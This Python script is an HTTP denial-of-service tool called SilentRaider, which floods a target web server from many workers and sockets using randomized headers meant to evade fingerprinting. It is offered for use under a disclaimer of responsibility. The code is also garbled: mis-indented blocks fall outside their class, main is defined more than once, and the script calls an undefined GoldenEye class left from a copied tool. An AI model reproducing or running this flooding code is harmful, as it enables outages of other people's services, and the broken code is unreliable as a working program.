#!/usr/bin/env python3

r"""
$Id: $

   ███████╗██╗██╗     ███████╗███╗   ██╗████████╗██████╗  █████╗ ██╗██████╗ ███████╗██████╗ 
   ██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
   ███████╗██║██║     █████╗  ██╔██╗ ██║   ██║   ██████╔╝███████║██║██║  ██║█████╗  ██████╔╝
   ╚════██║██║██║     ██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗██╔══██║██║██║  ██║██╔══╝  ██╔══██╗
   ███████║██║███████╗███████╗██║ ╚████║   ██║   ██║  ██║██║  ██║██║██████╔╝███████╗██║  ██║
   ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                         


This tool is a dos tool that is meant to put heavy load on HTTP servers
in order to bring them to their knees by exhausting the resource pool.

@author Shadow_Sadist

@date (10/20/2024)
@version 1.0

@TODO Test in python3

LEGAL NOTICE:
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY
THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
BY USING THIS SOFTWARE.
"""

import os
import signal
import sys
import random
import urllib.parse
import http.client
from multiprocessing import Process, Manager

# ANSI Colors
# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
MAGENTA = '\033[95m'


colors = [RED, GREEN, BLUE, CYAN, YELLOW, MAGENTA]

def get_random_color():
    return random.choice(colors)



# Banner with colors
BANNER = f"""
{GREEN}{BOLD}   ███████╗██╗██╗     ███████╗███╗   ██╗████████╗██████╗  █████╗ ██╗██████╗ ███████╗██████╗
   ██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
   ███████╗██║██║     █████╗  ██╔██╗ ██║   ██║   ██████╔╝███████║██║██║  ██║█████╗  ██████╔╝
   ╚════██║██║██║     ██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗██╔══██║██║██║  ██║██╔══╝  ██╔══██╗
   ███████║██║███████╗███████╗██║ ╚████║   ██║   ██║  ██║██║  ██║██║██████╔╝███████╗██║  ██║
   ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝{RESET}

              {CYAN}Tool: SilentRaider v1.0 by Shadow_Sadist{RESET}
"""

def signal_handler(sig, frame):
    print(f"{RED}\nExiting SilentRaider...{RESET}")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

def main():
    # Display banner as a title at script start
    os.system("clear")  # Clears the terminal before showing the banner
    print(BANNER)
print(f'{BLUE}SilentRaider v1.0 by Shadow_Sadist{RESET}')

def main():
    print(f"{BLUE}Starting attack in '{GREEN}SilentRaider{BLUE}' mode{RESET}")
    # Rest of the code goes here to start connections or attacks...


from multiprocessing import Process, Manager, Pool
import urllib.parse, ssl
import sys, getopt, random, time, os
import http.client
HTTPCLIENT = http.client

####
# Config
####
DEBUG = False
SSLVERIFY = True

####
# Constants
####
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT = 1.0

DEFAULT_WORKERS = 10
DEFAULT_SOCKETS = 500

SilentRaider_BANNER = 'SilentRaider v1.0 by Shadow_Sadist'

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': ['Linux x86_64', 'Linux i386'],
            'ext': ['X11']
        },
        'windows': {
            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
            'ext': ['WOW64', 'Win64; x64']
        },
        'mac': {
            'name': ['Macintosh'],
            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10)]
        },
    },
    'platform': {
        'webkit': {
            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                'ext_pre': ['compatible', 'Windows; U'],
                'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
            }
        },
        'gecko': {
            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}

####
# SilentRaider Class
####

class SilentRaider(object):

    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None
    useragents = []

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):

        # Set URL
        self.url = url

        # Initialize Manager
        self.manager = Manager()

        # Initialize Counters
        self.counter = self.manager.list((0, 0))


    def exit(self):
        self.stats()
        print(f"{RED}Shutting down SilentRaider{RESET}")

    def __del__(self):
        self.exit()

    def printHeader(self):

        # Taunt!
        print()
        print(BANNER)
        print()

    # Do the fun!
    def fire(self):

        self.printHeader()
        print(f"{get_random_color()}Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.{RESET}".format(self.method, self.nr_workers, self.nr_sockets))

        if DEBUG:
            print(f"{get_random_color()}Starting {0} concurrent workers{RESET}".format(self.nr_workers))

        # Start workers
        for i in range(int(self.nr_workers)):

            try:

                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except Exception:
                error(f"{RED}Failed to start worker {0}{RESET}".format(i))
                pass

        if DEBUG:
            print(f"{CYAN}Initiating monitor{RESET}")
        self.monitor()

    def stats(self):

        try:
            if self.counter[0] > 0 or self.counter[1] > 0:

                print(f"{GREEN}{0} SilentRaider strikes hit. ({1} Failed){RESET}".format(self.counter[0], self.counter[1]))

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print(f"{RED}\tServer may be DOWN!{RESET}")

                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except Exception:
            pass # silently ignore

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print(f"{RED}CTRL+C received. Killing all workers{RESET}")
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print(f"{BLUE}Killing worker {0}{RESET}".format(worker.name))
                        #worker.terminate()
                        worker.stop()
                    except Exception:
                        pass # silently ignore
                if DEBUG:
                    raise
                else:
                    pass

####
# Striker Class
####

class Striker(Process):


    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    # Flags
    runnable = True

    # Options
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):

        super(Striker, self).__init__()

        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urllib.parse.urlparse(url)

        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443


        self.referers = [
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            'http://' + self.host + '/'
            ]


    def __del__(self):
        self.stop()


    #builds random ascii string
    def buildblock(self, size):
        out_str = ''

        _LOWERCASE = list(range(97, 122))
        _UPPERCASE = list(range(65, 90))
        _NUMERIC   = list(range(48, 57))

        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str


    def run(self):

        if DEBUG:
            print(f"{get_random_color()}Starting worker {0}{RESET}".format(self.name))

        while self.runnable:

            try:

                for i in range(self.nr_socks):

                    if self.ssl:
                        if SSLVERIFY:
                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                        else:
                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)

                    self.socks.append(c)

                for conn_req in self.socks:

                    (url, headers) = self.createPayload()

                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method

                    conn_req.request(method.upper(), url, None, headers)

                for conn_resp in self.socks:

                    resp = conn_resp.getresponse()
                    self.incCounter()

                self.closeConnections()

            except:
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass # silently ignore

        if DEBUG:
            print(f"{get_random_color()}Worker {0} completed run. Sleeping...{RESET}".format(self.name))

    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass # silently ignore


    def createPayload(self):

        req_url, headers = self.generateData()

        random_keys = list(headers.keys())
        random.shuffle(random_keys)
        random_headers = {}

        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)

    def generateQueryString(self, ammount = 1):

        queryString = []

        for i in range(ammount):

            key = self.buildblock(random.randint(3,10))
            value = self.buildblock(random.randint(3,20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)

        return '&'.join(queryString)


    def generateData(self):

        returnCode = 0
        param_joiner = "?"

        if len(self.url) == 0:
            self.url = '/'

        if self.url.count("?") > 0:
            param_joiner = "&"

        request_url = self.generateRequestUrl(param_joiner)

        http_headers = self.generateRandomHeaders()


        return (request_url, http_headers)

    def generateRequestUrl(self, param_joiner = '?'):

        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))

    def getUserAgent(self):

        if self.useragents:
            return random.choice(self.useragents)

        # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]

        ## Mozilla Version
        mozilla_version = "Mozilla/5.0" # hardcoded for now, almost every browser is on this version except IE6

        ## System And Browser Information
        # Choose random OS
        os = USER_AGENT_PARTS['os'][random.choice(list(USER_AGENT_PARTS['os'].keys()))]
        os_name = random.choice(os['name'])
        sysinfo = os_name

        # Choose random platform
        platform = USER_AGENT_PARTS['platform'][random.choice(list(USER_AGENT_PARTS['platform'].keys()))]

        # Get Browser Information if available
        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']

            browser_string = random.choice(browser['name'])

            if 'ext_pre' in browser:
                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)

            sysinfo = "%s; %s" % (browser_string, sysinfo)

            if 'ext_post' in browser:
                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))


        if 'ext' in os and os['ext']:
            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))

        ua_string = "%s (%s)" % (mozilla_version, sysinfo)

        if 'name' in platform and platform['name']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))

        if 'details' in platform and platform['details']:
            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )

        if 'extensions' in platform and platform['extensions']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))

        return ua_string

    def generateRandomHeaders(self):

        # Random no-cache entries
        noCacheDirectives = ['no-cache', 'max-age=0']
        random.shuffle(noCacheDirectives)
        nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])

        # Random accept encoding
        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(1,int(len(acceptEncoding)/2))
        roundEncodings = acceptEncoding[:nrEncodings]

    http_headers = {
    'User-Agent': self.getUserAgent(), 
    'Cache-Control': 'no-cache', 
    'Accept-Encoding': ', '.join(roundEncodings),  
    'Connection': 'keep-alive',
    'Keep-Alive': str(random.randint(1, 1000)),  
    'Host': self.host,  
}

        # Randomly-added headers
        # These headers are optional and are
        # randomly sent thus making the
        # header count random and unfingerprintable
    if random.randrange(2) == 0:   
        acceptCharset = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
        random.shuffle(acceptCharset)
        http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(
            acceptCharset[0], 
            acceptCharset[1], 
            round(random.random(), 1), 
            round(random.random(), 1)
        )

        if random.randrange(2) == 0:
            # Random Referer
            url_part = self.buildblock(random.randint(5,10))

            random_referer = random.choice(self.referers) + url_part

            if random.randrange(2) == 0:
                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))

            http_headers['Referer'] = random_referer

        if random.randrange(2) == 0:
            # Random Content-Trype
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))

def get_http_headers():  
    
    return http_headers  

    # Housekeeping
    def stop(self):
        self.runnable = False
        self.closeConnections()
        self.terminate()

    # Counter Functions
    def incCounter(self):
        try:
            self.counter[0] += 1
        except Exception:
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except Exception:
            pass



####

####
# Other Functions
####

def usage():
    print()
    print(f'{RED}-----------------------------------------------------------------------------------------------------------{RESET}')
    print()
    print(f'{BLUE}SilentRaider v1.0 by Shadow_Sadist{RESET}')
    print()
    print(f'{BLUE}USAGE:{RESET}{RED}python3 SilentRaider.py <url> [OPTIONS]{RESET}')
    print()
    print(f'{BLUE}OPTIONS:')
    print(f'{BLUE}   _____________________________________________________________________________________________________')
    print(f'{BLUE}  |{RESET}{RED}       Flag:{RESET}{BLUE}      |{RESET}{GREEN}                Description:{RESET}                     {BLUE}| {RESET}          {BOLD}Default:{RESET}            {BLUE}|{RESET}')
    print(f'{BLUE}  |-------------------|-------------------------------------------------|-------------------------------|')
    print(f'{BLUE}  | -u, --useragents  | File with user-agents to use                    | (default: randomly generated) |')
    print(f'{BLUE}  | -w, --workers     | Number of concurrent workers                    | (default: {DEFAULT_WORKERS})  |')
    print(f'{BLUE}  | -s, --sockets     | Number of concurrent sockets                    | (default: {DEFAULT_SOCKETS})  |')
    print(f'{BLUE}  | -m, --method | HTTP Method to use \'get\' or \'post\'  or \'random\'| (default: get)                |')
    print(f'{BLUE}  | -d, --debug       | Enable Debug Mode [more verbose output]         | (default: False)              |')
    print(f'{BLUE}  | -n, --nosslcheck  | Do not verify SSL Certificate                   | (default: True)               |')
    print(f'{BLUE}  | -h, --help        | Shows this help                                 |                               |')
    print(f'{BLUE}  -------------------------------------------------------------------------------------------------------{RESET}')


def error(msg):
    # print help information and exit:
    sys.stderr.write(str(msg+"\n"))
    usage()
    sys.exit(2)

####
# Main
####

def main():

    try:

        if len(sys.argv) < 2:
            error(f'{RED}Please supply at least the URL{RESET}')

        url = sys.argv[1]

        if url == '-h':
            usage()
            sys.exit()

        if url[0:4].lower() != 'http':
            error(f"{RED}Invalid URL supplied{RESET}")

        if url == None:
            error(f"{RED}No URL supplied{RESET}")

        opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents" ])

        workers = DEFAULT_WORKERS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET

        uas_file = None
        useragents = []

        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            elif o in ("-u", "--useragents"):
                uas_file = a
            elif o in ("-s", "--sockets"):
                socks = int(a)
            elif o in ("-w", "--workers"):
                workers = int(a)
            elif o in ("-d", "--debug"):
                global DEBUG
                DEBUG = True
            elif o in ("-n", "--nosslcheck"):
                global SSLVERIFY
                SSLVERIFY = False
            elif o in ("-m", "--method"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error(f"{RED}method {0} is invalid{RESET}".format(a))
            else:
                error(f"{RED}option '"+o+"' doesn't exists{RESET}")


        if uas_file:
            try:
                with open(uas_file) as f:
                    useragents = f.readlines()
            except EnvironmentError:
                error(f"{RED}cannot read file {0}{RESET}".format(uas_file))

        goldeneye = GoldenEye(url)
        goldeneye.useragents = useragents
        goldeneye.nr_workers = workers
        goldeneye.method = method
        goldeneye.nr_sockets = socks

        goldeneye.fire()

    except getopt.GetoptError as err:

        # print help information and exit:
        sys.stderr.write(str(err))
        usage()
        sys.exit(2)

if __name__ == "__main__":
    main()
    os.system("clear") 
    print(BANNER) 

    while True:
        try:
            cmd = input(f"{RED}┌──[{RESET}{BLUE}SilentRaider{RESET}{RED}] \n└─⌈{RESET}{YELLOW}SR{RESET}{RED}⌋{RESET}{GREEN} ➔ {RESET}")
            if cmd.lower() == "exit" or cmd.lower() == "quit":
                print(f"{GREEN}\nExiting SilentRaider...{RESET}")
                break
            elif cmd.lower() == "help":
                usage()  
            else:
                print(f"{RED}Unknown command: {cmd}{RESET}")
        except KeyboardInterrupt:
            print(f"{RED}\nExiting SilentRaider...{RESET}")
            break
